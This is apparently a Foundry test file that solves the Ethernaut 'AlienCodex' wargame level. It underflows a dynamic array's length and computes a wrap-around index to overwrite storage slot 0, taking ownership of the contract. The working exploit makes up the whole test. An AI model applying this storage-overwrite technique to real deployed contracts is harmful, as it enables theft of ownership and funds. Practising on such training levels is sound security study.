pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../../src/ethernaut/core/Ethernaut.sol";

// import "../src/ethernaut/19-AlienCodex/AlienCodexFactory.sol";
// import "../src/ethernaut/19-AlienCodex/AlienCodex.sol";
abstract contract IAlienCodex {
    bytes32[] public codex;

    function owner() public view virtual returns (address);

    function make_contact() public virtual;

    function retract() public virtual;

    function record(bytes32 _content) public virtual;

    function revise(uint256 i, bytes32 _content) public virtual;
}

contract AlienCodexTest is Test {
    Ethernaut ethernaut;
    bytes32[] public codex;

    function setUp() public {
        //setup
        ethernaut = new Ethernaut();
    }

    function testAttck() public {
        address factory = deployCode("AlienCodexFactory.sol");
        console.log("deployment: ", factory);
        ethernaut.registerLevel(Level(factory));
        address levelAddress = ethernaut.createLevelInstance(Level(factory));

        // slove
        IAlienCodex alienCodex = IAlienCodex(levelAddress);
        console.log("alienCodex: ", address(alienCodex));
        console.log("owner: ", alienCodex.owner());
        alienCodex.make_contact();
        alienCodex.retract();

        uint256 idx = (2 ** 256 - 1) - uint256(keccak256(abi.encode(1))) + 1;
        bytes32 content = bytes32(uint256(uint160(address(this))));
        alienCodex.revise(idx, content);
        console.log("idx: ", idx);
        console.log("owner: ", alienCodex.owner());

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        assert(levelSuccessfullyPassed);
    }
}
